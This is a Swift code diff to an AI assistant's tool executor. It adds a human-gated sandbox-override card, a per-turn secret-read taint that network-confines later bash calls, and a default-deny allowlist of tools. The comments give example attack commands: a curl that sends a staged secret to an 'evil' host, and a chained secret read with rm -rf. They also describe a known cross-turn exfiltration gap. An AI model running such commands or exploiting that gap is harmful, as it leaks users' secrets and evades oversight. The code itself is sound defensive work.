@@ -103,11 +103,14 @@ actor ToolExecutor: ToolExecutorProtocol {
 
     /// B-Swift Phase F8: routed-bash executor closure (returns the outcome, not
     /// a ToolResult, so the coarse receipt pre-state material can be built from
-    /// the outcome — mirrors routedWriteExecutor/routedEditExecutor).
+    /// the outcome — mirrors routedWriteExecutor/routedEditExecutor). The final
+    /// `Bool` is the FLAW-1 turn-taint `networkDenied` flag.
     private var routedBashExecutor: @Sendable (
-        ToolCall, DaemonToolHostSession, DaemonToolRouting.BashRoutePlan
-    ) async -> DaemonToolRouting.BashExecutionOutcome = { call, session, plan in
-        await DaemonToolRouting.routeBash(call: call, session: session, plan: plan)
+        ToolCall, DaemonToolHostSession, DaemonToolRouting.BashRoutePlan, DaemonToolOrigin, Bool
+    ) async -> DaemonToolRouting.BashExecutionOutcome = { call, session, plan, origin, networkDenied in
+        await DaemonToolRouting.routeBash(
+            call: call, session: session, plan: plan, origin: origin,
+            networkDenied: networkDenied)
     }
 
     /// B-Swift Phase F8 test seam: override the routed-bash timeout.
@@ -193,6 +196,200 @@ actor ToolExecutor: ToolExecutorProtocol {
     /// Wire the action receipt store for undo/reversibility tracking.
     func setReceiptStore(_ store: ReceiptStore) {
         receiptStore = store
+    }
+
+    // MARK: - Security override (Wave 2, human-gated sandbox override)
+
+    /// Presents the hardware-click-only authorize card and returns the human's
+    /// decision (security-override Wave 2, L2/L12). This is the ONLY producer of an
+    /// `.allow` decision reachable from tool execution. Default FAILS CLOSED
+    /// (`.deny`) — with no card wired, a security block stays a block (Invariant F).
+    /// Production wires it to `SecurityOverridePanel` (whose Allow buttons are the
+    /// only callers of the underlying `SecurityOverridePrompt.approve(_:)`); it
+    /// MUST NOT be wired to any legacy approval route (VoiceCommandParser, TestServer
+    /// `/approve`, `respondToApproval()`), since a model can drive those.
+    private var securityOverridePresenter:
+        @Sendable (SecurityDenial, String) async -> SecurityOverrideDecision = { _, _ in .deny }
+
+    /// The standing sandbox-override grant store (L8/L9). `nil` ⇒ no auto-apply and
+    /// no persistence (every override is single-use, re-prompted each time).
+    private var grantStore: GrantStore?
+
+    /// Wire the authorize-card presenter (production: `SecurityOverridePanel`).
+    func setSecurityOverridePresenter(
+        _ presenter: @escaping @Sendable (SecurityDenial, String) async -> SecurityOverrideDecision
+    ) {
+        securityOverridePresenter = presenter
+    }
+
+    /// Wire the standing grant store (production: `GrantStore()`).
+    func setGrantStore(_ store: GrantStore?) {
+        grantStore = store
+    }
+
+    // MARK: - Secret-read turn taint (FLAW-1, same-turn split-call exfil)
+
+    /// The turn in which a Secrets-tier override was authorized (approved on the
+    /// card OR auto-applied from a standing grant). Once set, EVERY subsequent
+    /// routed Host bash in that same turn carries `network_denied: true` so the
+    /// daemon runs it network-denied + workspace-write-only — the secret the
+    /// model just read (in context, or staged to /tmp) cannot be exfiltrated by a
+    /// later split call (`curl -d @/tmp/x evil`) in the same turn. Every OTHER
+    /// tool in the tainted turn passes the default-deny egress gate below
+    /// (`localSafeToolsAfterSecretRead`) — bash is the only egress-capable tool
+    /// allowed through, because it is the one the daemon network-confines.
+    ///
+    /// ACCEPTED CROSS-TURN RESIDUAL (documented, not fixed): the taint is
+    /// TURN-scoped. A secret that entered the conversation context (or was
+    /// staged into a workspace file, which tainted bash/write still permit)
+    /// persists into a NEW turn, where the taint is clear and egress tools are
+    /// allowed again. The primary control is the informed-consent card (L12):
+    /// the user knowingly exposed that secret to the model; Secrets grants are
+    /// never persistent ("always" is refused), every override is audited, and
+    /// the exposure window is one authorization. Closing the cross-turn hole
+    /// would require conversation-scoped secret tracking/redaction, which is
+    /// out of scope for the turn-taint mechanism.
+    private var secretTaintTurnID: String?
+    /// Taint raised on a turn WITHOUT a workflow turn id. With no id to compare,
+    /// the taint cannot prove a new turn started, so it holds (fail closed) until
+    /// `beginTurn` explicitly resets it.
+    private var secretTaintUnscoped = false
+
+    /// Reset the secret-read taint at a turn boundary. Called by
+    /// `PipelineCoordinator` at the START of every turn (where `currentTurnID` is
+    /// minted); the turn-ID keying below is belt-and-suspenders for any lane that
+    /// misses this call.
+    func beginTurn() {
+        secretTaintTurnID = nil
+        secretTaintUnscoped = false
+    }
+
+    /// Raise the taint for the current turn (a Secrets-tier override was just
+    /// authorized on it).
+    private func markSecretReadTaint(turnID: String?) {
+        if let turnID {
+            secretTaintTurnID = turnID
+        } else {
+            secretTaintUnscoped = true
+        }
+    }
+
+    /// Whether a bash on the given turn must run network-denied. Fail-closed on
+    /// missing ids: an unscoped taint always holds; a scoped taint holds when the
+    /// current turn id matches OR is unknown (a nil id cannot prove a NEW turn).
+    private func isSecretReadTainted(currentTurnID: String?) -> Bool {
+        if secretTaintUnscoped { return true }
+        guard let tainted = secretTaintTurnID else { return false }
+        guard let current = currentTurnID else { return true }
+        return current == tainted
+    }
+
+    /// The ONLY tools allowed in a secret-tainted turn (besides `bash`, which is
+    /// allowed because the daemon network-confines it via `network_denied`).
+    ///
+    /// This is a default-deny ALLOWLIST, deliberately not a denylist: any tool
+    /// NOT here is denied after a secret read, so a future tool cannot silently
+    /// become an exfil path (the same fail-safe principle as the L1 origin
+    /// inversion). Add a tool here ONLY if it provably cannot transmit data off
+    /// the machine. Everything with network reach, message sending, agent
+    /// delegation, arbitrary code execution, UI driving (a browser can be typed
+    /// into), or cloud-synced state (Apple calendar/contacts/notes/reminders/
+    /// mail sync through iCloud/servers) stays denied.
+    static let localSafeToolsAfterSecretRead: Set<String> = [
+        // Local file IO — workspace-confined by the daemon routing layer.
+        "read", "write", "edit",
+        // Local database / config surfaces.
+        "session_search", "self_config",
+        // Local scheduler CRUD (scheduler.db).
+        "scheduler_list", "scheduler_create", "scheduler_update",
+        "scheduler_delete", "scheduler_trigger",
+        // Local task tracking / user-facing prompts / persona / window moves.
+        "till_done", "input_request", "roleplay", "window_control",
+    ]
+
+    /// The truthful daemon origin for a tool call's context (L1 — also closes gap
+    /// #38). FAIL-SAFE INVERTED: `owner_interactive` is granted ONLY on the
+    /// explicitly-enumerated interactive sources (voice/text, no proactive
+    /// context, not a script block); every OTHER source — including `.unknown`,
+    /// `.relay`, and any case added later — maps to a NON-interactive origin, so
+    /// the daemon jails it AND refuses any sandbox override on its behalf. An
+    /// unclassifiable context must never be the one that earns override rights.
+    /// `static` + pure so the derivation is hermetically testable.
+    static func daemonToolOrigin(for context: ToolExecutorContext) -> DaemonToolOrigin {
+        if context.isScriptBlock { return .scriptBlock }
+        if context.proactiveContext != nil {
+            return context.actionSource == .scheduler ? .scheduler : .proactive
+        }
+        switch context.actionSource {
+        case .voice, .text:
+            return .ownerInteractive
+        case .scheduler:
+            return .scheduler
+        case .skill:
+            return .autoSkill
+        case .relay, .unknown:
+            // Fail-safe default: not provably interactive ⇒ jailed, no override.
+            return .proactive
+        }
+    }
+
+    /// Build the typed `SecurityDenial` for a DamageControl `.block`, if the block
+    /// was a protected zero-access PATH (not an ordinary bash-pattern block). `nil`
+    /// ⇒ not a security-path denial (no card, generic message).
+    private func securityDenial(
+        for call: ToolCall, context: ToolExecutorContext, reason: String
+    ) async -> SecurityDenial? {
+        guard let target = await damageControlPolicy.securityDenialTarget(
+            toolName: call.name, arguments: call.arguments, locality: context.modelLocality)
+        else { return nil }
+        return SecurityDenial(
+            reason: reason,
+            target: target,
+            tier: SecurityTier.classify(absolutePath: target))
+    }
+
+    /// Resolve a human-gated override for an overridable security denial (L2/L9).
+    /// Returns a minted per-call override to re-submit with, or `nil` (deny).
+    ///
+    /// Fail-closed layering: only an interactive owner turn can override (L1/L9 —
+    /// no human is present on an autonomous turn). A standing grant for the EXACT
+    /// canonical target auto-applies WITHOUT a prompt (L9); otherwise the
+    /// hardware-only card is presented and, on Allow, a persistent/expiring grant
+    /// is stored (a `once` grant is single-use).
+    private func resolveSecurityOverride(
+        denial: SecurityDenial, command: String, context: ToolExecutorContext
+    ) async -> DaemonSecurityOverride? {
+        guard denial.overridable else { return nil }
+        let origin = Self.daemonToolOrigin(for: context)
+        guard origin.isInteractive else { return nil }
+        let nowMs = UInt64(Date().timeIntervalSince1970 * 1000)
+        // L9 auto-apply: a live standing grant authorizes this exact target silently.
+        if let store = grantStore {
+            let grant = await store.lookup(canonicalTarget: denial.target, nowMs: nowMs)
+            if let auto = GrantStore.autoApplyOverride(
+                grant: grant, denial: denial, origin: origin, nowMs: nowMs) {
+                if denial.tier == .secrets {
+                    markSecretReadTaint(turnID: context.workflowTurnID)
+                }
+                return auto
+            }
+        }
+        // Otherwise present the hardware-only authorize card.
+        let decision = await securityOverridePresenter(denial, command)
+        guard case .allow(let kind) = decision else { return nil }
+        if kind != .once, let store = grantStore {
+            try? await store.record(
+                canonicalTarget: denial.target, tier: denial.tier, kind: kind, nowMs: nowMs)
+        }
+        // FLAW-1: an authorized Secrets read taints the REST of this turn — every
+        // subsequent routed bash runs network-denied so the secret can't be split-
+        // call exfiltrated. Marked at authorization time (before the read runs):
+        // fail closed even if the approved call itself errors.
+        if denial.tier == .secrets {
+            markSecretReadTaint(turnID: context.workflowTurnID)
+        }
+        return DaemonSecurityOverride.mint(
+            target: denial.target, tier: denial.tier, kind: kind, nowMs: nowMs)
     }
 
     // MARK: - Execute
@@ -361,6 +558,42 @@ actor ToolExecutor: ToolExecutorProtocol {
                 result: .error("Unknown tool: \(call.name)"),
                 approvedByUser: nil,
                 damageControlIntervened: false,
+                latencyMs: nil
+            )
+        }
+
+        // ── 6a. Secret-taint egress gate (FLAW-1 extension, default-deny) ──
+        // After an approved Secrets-tier read this turn, the secret is in model
+        // context — ANY egress-capable tool (fetch_url, web_search, mail,
+        // delegate_agent, run_skill, show_html, computer-use typing into a
+        // browser, iCloud-synced Apple tools, …) could exfiltrate it. Only the
+        // explicit local-safe allowlist passes; `bash` passes because the daemon
+        // network-confines it via `network_denied` (the original FLAW-1 fix).
+        // Runs BEFORE the daemon-routing switch so routed tools are covered too.
+        if call.name != "bash",
+           !Self.localSafeToolsAfterSecretRead.contains(call.name),
+           isSecretReadTainted(currentTurnID: context.workflowTurnID)
+        {
+            await securityLogger.log(
+                event: "secret_taint_egress_denied",
+                toolName: call.name,
+                decision: "deny",
+                reasonCode: "secretReadTaintEgress",
+                approved: nil,
+                success: nil,
+                error: nil,
+                arguments: call.arguments
+            )
+            debugLog(
+                debugConsole, .approval,
+                "Secret-taint egress gate denied \(call.name) (tainted turn)")
+            return ToolExecutorResult(
+                result: .error(
+                    "For your security, after reading a protected secret this turn "
+                    + "I can't take actions that could send data off this machine "
+                    + "(\(call.name)). Start a new request if you need that."),
+                approvedByUser: nil,
+                damageControlIntervened: true,
                 latencyMs: nil
             )
         }
@@ -556,18 +789,24 @@ actor ToolExecutor: ToolExecutorProtocol {
     /// Returns `(blocked: nil, intervened: false)` if allowed; `(nil, true)` if
     /// disaster/confirmManual countdown PROCEEDS; `(result, true)` if blocked or
     /// the countdown cancelled (the caller returns `blocked`).
+    ///
+    /// `exemptZeroAccessTarget` (FLAW-2): set ONLY by the approved-override
+    /// re-submit — the single zero-access rule the human just authorized is
+    /// skipped; every other DamageControl check still runs.
     private func runDamageControlGate(
         call: ToolCall,
-        context: ToolExecutorContext
-    ) async -> (blocked: ToolExecutorResult?, intervened: Bool) {
+        context: ToolExecutorContext,
+        exemptZeroAccessTarget: String? = nil
+    ) async -> (blocked: ToolExecutorResult?, intervened: Bool, securityDenial: SecurityDenial?) {
         let dcVerdict = await damageControlPolicy.evaluate(
             toolName: call.name,
             arguments: call.arguments,
-            locality: context.modelLocality
+            locality: context.modelLocality,
+            exemptZeroAccessTarget: exemptZeroAccessTarget
         )
         switch dcVerdict {
         case .allow:
-            return (nil, false)
+            return (nil, false, nil)
 
         case .block(let reason):
             await securityLogger.log(
@@ -581,11 +820,16 @@ actor ToolExecutor: ToolExecutorProtocol {
                 arguments: call.arguments
             )
             debugLog(debugConsole, .approval, "DC block: \(call.name) — \(reason)")
+            // Part A (L12): a protected/secret PATH block surfaces a clear spoken
+            // line ("I can't read ~/.secrets …") instead of an opaque failure. A
+            // non-path (bash-pattern) block keeps the generic message.
+            let denial = await securityDenial(for: call, context: context, reason: reason)
+            let message = denial?.spokenMessage ?? "Blocked by damage-control policy: \(reason)"
             return (ToolExecutorResult(
-                result: .error("Blocked by damage-control policy: \(reason)"),
+                result: .error(message),
                 approvedByUser: nil,
                 damageControlIntervened: true,
-                latencyMs: nil), true)
+                latencyMs: nil), true, denial)
 
         case .disaster(let reason):
             await securityLogger.log(
@@ -608,9 +852,9 @@ actor ToolExecutor: ToolExecutorProtocol {
                     result: .error("Action cancelled: \(reason)"),
                     approvedByUser: false,
                     damageControlIntervened: true,
-                    latencyMs: nil), true)
+                    latencyMs: nil), true, nil)
             }
-            return (nil, true)  // countdown elapsed → proceed
+            return (nil, true, nil)  // countdown elapsed → proceed
 
         case .confirmManual(let reason):
             await securityLogger.log(
@@ -633,9 +877,9 @@ actor ToolExecutor: ToolExecutorProtocol {
                     result: .error("Action cancelled: \(reason)"),
                     approvedByUser: false,
                     damageControlIntervened: true,
-                    latencyMs: nil), true)
+                    latencyMs: nil), true, nil)
             }
-            return (nil, true)  // countdown elapsed → proceed
+            return (nil, true, nil)  // countdown elapsed → proceed
         }
     }
 
@@ -1184,6 +1428,64 @@ actor ToolExecutor: ToolExecutorProtocol {
     // = a) → narration. Approval is upstream. Fail-closed on outage (no local
     // bash fallback — mutations irreversible). The daemon's own `damage.rs`
     // adds defense-in-depth (system/workspace scope) on top of the Swift rules.
+    /// Re-submit an owner-authorized bash carrying the human-gated daemon override
+    /// (security-override Wave 2, the "Allow" tail of deny → card → re-submit).
+    ///
+    /// FLAW-2: DamageControl RE-RUNS here in full, exempting ONLY the one
+    /// zero-access rule for the exact canonical target the human authorized. The
+    /// human approved reading ONE protected path — not the rest of the command:
+    /// a chained catastrophe (`cat ~/.secrets && rm -rf ~/Documents`), a
+    /// curl-pipe-shell, a second protected path, or a no-delete-path hit is still
+    /// blocked/countdown-gated exactly as on any other call. A re-block returns
+    /// the denial WITHOUT re-offering the card (no approve-loop). The daemon then
+    /// still re-validates every L-rule (origin, expiry, call_id, canonical tier)
+    /// and relaxes ONLY that one canonical leaf. Routes DIRECTLY (never the test
+    /// seam) so the override reaches the real daemon socket. Origin is
+    /// `owner_interactive` (guaranteed by `resolveSecurityOverride`'s
+    /// interactive-only gate — else no override exists).
+    private func executeApprovedRoutedBash(
+        call: ToolCall,
+        plan: DaemonToolRouting.BashRoutePlan,
+        context: ToolExecutorContext,
+        override: DaemonSecurityOverride,
+        startTime: Date
+    ) async -> ToolExecutorResult {
+        let reGate = await runDamageControlGate(
+            call: call, context: context,
+            exemptZeroAccessTarget: override.targetPath)
+        if let reBlocked = reGate.blocked {
+            debugLog(debugConsole, .approval,
+                "Approved override re-submit still blocked by DamageControl: \(call.name)")
+            return reBlocked
+        }
+        let origin = Self.daemonToolOrigin(for: context)
+        // FLAW-1: a Secrets authorization just tainted this turn; the approved
+        // call itself also rides network-denied (the daemon's L5 relax already
+        // denies network for Secrets — this covers a General-tier approval inside
+        // an already-tainted turn).
+        let networkDenied = isSecretReadTainted(currentTurnID: context.workflowTurnID)
+        let outcome = await DaemonToolRouting.routeBash(
+            call: call, session: daemonToolHostSession, plan: plan,
+            origin: origin, securityOverride: override, networkDenied: networkDenied)
+        let result = DaemonToolRouting.mapBashOutcome(outcome)
+        await runPostToolUseHooks(toolName: call.name, output: result.output)
+        let latencyMs = Int(Date().timeIntervalSince(startTime) * 1000)
+        debugLog(debugConsole, .toolResult,
+            "Approved routed bash (override): \(call.name) success=\(!result.isError)")
+        await recordToolOutcome(
+            toolName: call.name, arguments: call.arguments,
+            success: !result.isError,
+            error: result.isError ? result.output : nil,
+            startTime: startTime)
+        let conversationOutput = result.isError
+            ? Self.friendlyRoutedBashError(for: result.output) : result.output
+        return ToolExecutorResult(
+            result: ToolResult(output: conversationOutput, isError: result.isError),
+            approvedByUser: true,
+            damageControlIntervened: true,
+            latencyMs: latencyMs)
+    }
+
     private func executeRoutedBash(
         call: ToolCall,
         plan: DaemonToolRouting.BashRoutePlan,
@@ -1230,9 +1532,28 @@ actor ToolExecutor: ToolExecutorProtocol {
         //   continue; blocked / cancelled → return.
         let damageControlGate = await runDamageControlGate(call: call, context: context)
         if let damageControlBlocked = damageControlGate.blocked {
+            // Security-override Wave 2 (deny → card → re-submit): a protected/secret
+            // PATH block may be human-overridable. Offer the hardware-only authorize
+            // card (interactive owner only); on Allow, re-submit the SAME bash
+            // carrying a daemon override scoped to exactly that one canonical target.
+            if let denial = damageControlGate.securityDenial, denial.overridable {
+                let command = call.arguments["command"] as? String ?? ""
+                if let override = await resolveSecurityOverride(
+                    denial: denial, command: command, context: context) {
+                    return await executeApprovedRoutedBash(
+                        call: call, plan: plan, context: context,
+                        override: override, startTime: startTime)
+                }
+            }
             return damageControlBlocked
         }
         let damageControlIntervened = damageControlGate.intervened
+        // L1 / gap #38: the routed bash carries the TRUTHFUL origin so a proactive/
+        // scheduler/script bash is jailed daemon-side (and can never override).
+        let origin = Self.daemonToolOrigin(for: context)
+        // FLAW-1: in a turn where a Secrets-tier override was authorized, every
+        // subsequent bash runs network-denied + workspace-write-only daemon-side.
+        let networkDenied = isSecretReadTainted(currentTurnID: context.workflowTurnID)
 
         let executionArguments = computeExecutionArguments(for: call, context: context)
 
@@ -1251,7 +1572,7 @@ actor ToolExecutor: ToolExecutorProtocol {
             let session = daemonToolHostSession
             outcome = try await withThrowingTaskGroup(of: DaemonToolRouting.BashExecutionOutcome.self) { group in
                 group.addTask {
-                    await executor(call, session, plan)
+                    await executor(call, session, plan, origin, networkDenied)
                 }
                 group.addTask {
                     try await Task.sleep(nanoseconds: UInt64(timeoutSeconds * 1_000_000_000))
@@ -1426,12 +1747,13 @@ actor ToolExecutor: ToolExecutorProtocol {
         routedEditTimeoutOverride = seconds
     }
 
-    /// Test seam setter (F8): override the routed-bash executor.
+    /// Test seam setter (F8): override the routed-bash executor. The trailing
+    /// `Bool` is the FLAW-1 turn-taint `networkDenied` flag.
     /// GUARDED: `FAE_TEST_SEAMS` is debug-only, compiled OUT of release
     /// (red-team F4 rule, extended to bash).
     func setRoutedBashExecutorForTesting(
         _ fn: @Sendable @escaping (
-            ToolCall, DaemonToolHostSession, DaemonToolRouting.BashRoutePlan
+            ToolCall, DaemonToolHostSession, DaemonToolRouting.BashRoutePlan, DaemonToolOrigin, Bool
         ) async -> DaemonToolRouting.BashExecutionOutcome
     ) {
         routedBashExecutor = fn
